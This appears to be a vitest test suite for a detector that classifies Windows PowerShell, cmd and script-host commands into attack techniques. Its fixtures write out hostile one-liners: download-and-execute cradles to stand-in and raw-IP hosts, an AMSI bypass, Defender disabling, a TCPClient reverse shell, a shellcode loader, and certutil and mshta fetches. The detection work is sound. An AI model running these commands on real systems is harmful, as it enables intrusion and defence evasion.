import { describe, expect, it } from 'vitest'
import { buildContext, classify } from '../techniques'
import { preprocess } from '../preprocess'

function analyze(text: string, raw = text) {
  const pre = preprocess(raw)
  return classify(buildContext(text, pre.flags, pre.interpreter))
}
const ids = (text: string, raw = text) => analyze(text, raw).map((s) => s.id)
const specOf = (text: string, id: string, raw = text) =>
  analyze(text, raw).find((s) => s.id === id)?.specificity

describe('download cradle', () => {
  it('fires when fetched content flows into an interpreter', () => {
    const sigs = analyze("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')")
    const c = sigs.find((s) => s.id === 'download-cradle')
    expect(c).toBeTruthy()
    expect(c!.techniqueIds).toContain('T1105')
    expect(c!.trigger).toBeTruthy()
  })

  it('benign twin: download to a FILE (no IEX sink) does NOT fire', () => {
    expect(ids("Invoke-WebRequest https://example.com/data.json -OutFile data.json"))
      .not.toContain('download-cradle')
  })
})

describe('evasion-flag clustering', () => {
  it('fires on a 3+ evasion-flag cluster carrying an -enc payload', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc SQBFAFgA"
    expect(ids('IEX $x', raw)).toContain('evasion-cluster')
  })

  it('benign twin: evasion cluster running a LOCAL -File script does NOT fire', () => {
    const raw = "powershell -nop -w hidden -ExecutionPolicy Bypass -File C:\\ops\\backup.ps1"
    expect(ids('Get-ChildItem', raw)).not.toContain('evasion-cluster')
  })

  it('the -File discriminator is load-bearing: the same cluster+payload fires, and a -File in the corpus suppresses it', () => {
    const raw = 'powershell -nop -w hidden -ep bypass' // 3-flag cluster, no -File
    const payload = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    // cluster>=3 AND payload (fetch+IEX sink) AND no -File -> fires
    expect(ids(payload, raw)).toContain('evasion-cluster')
    // same cluster+payload, but a -File mention in the corpus -> localFile suppresses it
    expect(ids('-File C:\\ops\\job.ps1 ; ' + payload, raw)).not.toContain('evasion-cluster')
  })
})

describe('co-occurrence upgrade', () => {
  it('bumps evasion-cluster weak -> strong when a download cradle co-fires', () => {
    const raw = "powershell -nop -w hidden -ep bypass -enc AAAA"
    const script = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    expect(specOf(script, 'evasion-cluster', raw)).toBe('strong')
  })
})

describe('determinism / ordering', () => {
  it('returns signals in a stable rule order', () => {
    const a = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    const b = ids("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')")
    expect(a).toEqual(b)
  })
})

describe('AMSI / ETW / Defender tampering', () => {
  it('AMSI reflection patch is near-dispositive on its own', () => {
    const s = analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
    const a = s.find((x) => x.id === 'amsi-reflection')
    expect(a).toBeTruthy()
    expect(a!.specificity).toBe('near-dispositive')
  })

  it('AMSI memory patch (AmsiScanBuffer + VirtualProtect) is near-dispositive', () => {
    const s = analyze("$p = VirtualProtect $addr 0x1000 0x40 ([ref]$old); ... AmsiScanBuffer patch")
    expect(s.find((x) => x.id === 'amsi-memory-patch')?.specificity).toBe('near-dispositive')
  })

  it('Defender cmdlet tampering stays STRONG (installer/GPO benign twin exists)', () => {
    const s = analyze("Set-MpPreference -DisableRealtimeMonitoring $true")
    const d = s.find((x) => x.id === 'defender-tamper')
    expect(d).toBeTruthy()
    expect(d!.specificity).toBe('strong')
  })

  it('benign twin: a legitimate Add-MpPreference exclusion by itself is only STRONG, never near-dispositive', () => {
    const s = analyze("Add-MpPreference -ExclusionPath 'C:\\Program Files\\VendorApp'")
    const nd = s.filter((x) => x.specificity === 'near-dispositive')
    expect(nd).toHaveLength(0)
  })

  it('ETW tampering fires (strong)', () => {
    const s = analyze("[Reflection.Assembly]::Load(...); EtwEventWrite patched via reflection")
    expect(s.find((x) => x.id === 'etw-tamper')?.specificity).toBe('strong')
  })

  it('benign twin: a plain ETW/EventProvider diagnostics reference (no patch primitive) does NOT fire', () => {
    expect(ids('New-Object System.Diagnostics.Eventing.EventProvider($guid); EtwEventWrite')).not.toContain('etw-tamper')
  })
})

describe('ClickFix / paste-and-run', () => {
  it('fires on a hidden-window one-liner that fetches and IEXes', () => {
    const raw = "powershell -nop -w hidden -c IEX (iwr http://evil.test/x).Content"
    expect(ids('IEX (iwr http://evil.test/x).Content', raw)).toContain('clickfix')
  })
  it('fires on conhost --headless powershell', () => {
    expect(ids("conhost --headless powershell -nop -c iex(irm http://x.test/a)"))
      .toContain('clickfix')
  })
  it('benign twin: a plain hidden -File task does NOT fire', () => {
    const raw = "powershell -w hidden -nop -File C:\\ops\\job.ps1"
    expect(ids('Get-Date', raw)).not.toContain('clickfix')
  })
  it('benign twin: a hidden-window -File deployment that fetches+IEXes internally does NOT fire (file exec, not paste-and-run)', () => {
    const raw = 'powershell -nop -w hidden -File C:\\ops\\deploy.ps1'
    const text = "-File C:\\ops\\deploy.ps1 ; IEX (New-Object Net.WebClient).DownloadString('http://mirror.local/pkg')"
    expect(ids(text, raw)).not.toContain('clickfix')
  })
  it('fires on mshta launching a remote .hta', () => {
    expect(ids('mshta https://evil.test/x.hta')).toContain('clickfix')
  })
  it('fires on a CAPTCHA/verify-human decoy paired with a downloader', () => {
    expect(ids("# verify you are human - ray id 8f2 #; IEX (iwr http://evil.test/x).Content")).toContain('clickfix')
  })
  it('benign twin: gpg --verify (routine signature verification) does NOT fire — a bare --verify needs real ClickFix context', () => {
    expect(ids('gpg --verify sig.asc release.tar')).not.toContain('clickfix')
  })
})

describe('beaconing + reverse shell + loaders + persistence', () => {
  it('beaconing: jittered sleep loop + same-host fetch', () => {
    expect(ids("while($true){ Start-Sleep (Get-Random -Min 30 -Max 90); IEX (New-Object Net.WebClient).DownloadString('http://c2.test/t') }"))
      .toContain('beaconing')
  })
  it('reverse-shell: TCPClient stream feeding IEX is near-dispositive', () => {
    const s = analyze("$c=New-Object Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();IEX $data")
    expect(s.find((x) => x.id === 'reverse-shell')?.specificity).toBe('near-dispositive')
  })
  it('fileless-loader: VirtualAlloc + CreateThread on a byte array', () => {
    expect(ids("$b=[byte[]](0x90,0x90); $a=VirtualAlloc 0 $b.Length 0x3000 0x40; CreateThread 0 0 $a 0 0 0"))
      .toContain('fileless-loader')
  })
  it('persistence: Register-ScheduledTask fires (strong)', () => {
    const s = analyze("Register-ScheduledTask -TaskName Updater -Action $a -Trigger $t")
    expect(s.find((x) => x.id === 'persistence')?.specificity).toBe('strong')
  })
  it('benign twin: a bare Start-Sleep with no loop/fetch is not beaconing', () => {
    expect(ids("Start-Sleep -Seconds 5")).not.toContain('beaconing')
  })
  it('persistence fires as a FACT on a routine scheduled task but stays strong (cannot characterize alone)', () => {
    const s = analyze('Register-ScheduledTask -TaskName NightlyBackup -Action $a -Trigger $t')
    const p = s.find((x) => x.id === 'persistence')
    expect(p).toBeTruthy()
    expect(p!.specificity).toBe('strong')
  })
  it('benign twin: Add-Type compiling C# WITHOUT an alloc/inject primitive does NOT fire fileless-loader', () => {
    expect(ids("Add-Type -TypeDefinition 'public class N { public static int F(){return 1;} }'"))
      .not.toContain('fileless-loader')
  })
})

describe('LOLBin surfaces through classify', () => {
  it('emits a lolbin signal naming the binary', () => {
    const s = analyze("certutil.exe -urlcache -split -f http://45.9.148.20/a.exe a.exe")
    const l = s.find((x) => x.id === 'lolbin')
    expect(l).toBeTruthy()
    expect(l!.label.toLowerCase()).toContain('certutil')
  })
})

describe('WSH honesty signals', () => {
  it('the unconditional WSH-limits notice fires for interpreter in {mshta, wscript, cscript} regardless of corpus content', () => {
    expect(ids('C:\\Users\\Public\\a.vbs', 'wscript C:\\Users\\Public\\a.vbs')).toContain('wsh-decode-limits')
    const wshCtx = buildContext('Chr(72)&Chr(105)', [], 'mshta')
    expect(classify(wshCtx).map((s) => s.id)).toContain('wsh-decode-limits')
  })

  it('the concat/eval presence-detector fires on VBScript concat, JScript concat, and Execute/eval', () => {
    expect(classify(buildContext('"po" & "wershell"', [], 'wscript')).map((s) => s.id)).toContain('wsh-concat-eval-present')
    expect(classify(buildContext('"a"+"b"', [], 'cscript')).map((s) => s.id)).toContain('wsh-concat-eval-present')
    expect(classify(buildContext('Execute("malicious")', [], 'mshta')).map((s) => s.id)).toContain('wsh-concat-eval-present')
  })

  it('neither WSH honesty signal fires for a plain PowerShell input (interpreter-gated)', () => {
    const sigs = classify(buildContext('"a" & "b" ; Execute("x")', [], 'powershell')).map((s) => s.id)
    expect(sigs).not.toContain('wsh-decode-limits')
    expect(sigs).not.toContain('wsh-concat-eval-present')
  })
})

describe('cmd-cradle', () => {
  it('fires on a for /f loop wrapping a download/exec inner command (finger)', () => {
    const s = analyze("for /f %e in ('finger user@45.9.148.20') do %e", "cmd /c for /f %e in ('finger user@45.9.148.20') do %e")
    const c = s.find((x) => x.id === 'cmd-cradle')
    expect(c).toBeTruthy()
    expect(c!.techniqueIds).toEqual(expect.arrayContaining(['T1059.003', 'T1105']))
  })

  it('fires on a for /f loop wrapping a nested powershell payload', () => {
    expect(ids("for /f %e in ('powershell -enc AAAA') do %e")).toContain('cmd-cradle')
  })

  it('benign twin: for /f alone (no download/exec inner command) does NOT fire', () => {
    expect(ids("for /f %i in ('dir /b') do echo %i")).not.toContain('cmd-cradle')
  })

  it('benign twin: for /f parsing robocopy/reg query output does NOT fire (FP pressure test)', () => {
    expect(ids('for /f "tokens=3" %a in (\'reg query HKCU\\Software /v Ver\') do echo %a')).not.toContain('cmd-cradle')
    expect(ids('for /f %f in (\'robocopy C:\\src C:\\dst /L\') do echo %f')).not.toContain('cmd-cradle')
  })

  it('co-occurrence upgrade: cmd-cradle + a broadened ClickFix decoy upgrades cmd-cradle to near-dispositive', () => {
    const script = "for /f %e in ('finger user@45.9.148.20') do %e & echo --Verify... press ENTER to continue"
    expect(specOf(script, 'cmd-cradle')).toBe('near-dispositive')
  })
})

describe('broadened ClickFix decoy phrases', () => {
  it('fires on "--Verify... press ENTER" style decoys from the live-test sample', () => {
    expect(ids('echo --Verify... press ENTER to continue')).toContain('clickfix')
  })
})

describe('mshta interpreter-aware rule', () => {
  it('fires when interpreter is mshta with a URL target', () => {
    const s = classify(buildContext('http://evil.test/x.hta', [], 'mshta'))
    const m = s.find((x) => x.id === 'mshta-interpreter')
    expect(m).toBeTruthy()
    expect(m!.techniqueIds).toContain('T1218.005')
  })

  it('dual-tags T1059.005 when the discriminator is an inline vbscript: scheme', () => {
    const s = classify(buildContext('vbscript:CreateObject("WScript.Shell").Run("calc.exe")', [], 'mshta'))
    const m = s.find((x) => x.id === 'mshta-interpreter')
    expect(m!.techniqueIds).toEqual(expect.arrayContaining(['T1218.005', 'T1059.005']))
  })

  it('benign twin: mshta with no URL/.hta/inline-script discriminator does NOT fire', () => {
    const s = classify(buildContext('about:blank', [], 'mshta'))
    expect(s.map((x) => x.id)).not.toContain('mshta-interpreter')
  })
})

describe('wscript/cscript script-execution rule', () => {
  it('fires on wscript launching a .vbs from a suspicious path with //E:', () => {
    const s = classify(buildContext('C:\\Users\\Public\\payload.vbs', [{ flag: '//E:vbscript', raw: '//E:vbscript', techniqueIds: ['T1059.005'] }], 'wscript'))
    const w = s.find((x) => x.id === 'wsh-script-exec')
    expect(w).toBeTruthy()
    expect(w!.techniqueIds).toContain('T1059.005')
  })

  it('fires on cscript launching a .js from a suspicious AppData path', () => {
    const s = classify(buildContext('C:\\Users\\bob\\AppData\\Roaming\\dropper.js', [], 'cscript'))
    expect(s.map((x) => x.id)).toContain('wsh-script-exec')
  })

  it('benign twin: wscript launching a .vbs from a trusted path with no //E: flag does NOT fire', () => {
    const s = classify(buildContext('C:\\Program Files\\LegitApp\\installer.vbs', [], 'wscript'))
    expect(s.map((x) => x.id)).not.toContain('wsh-script-exec')
  })
})
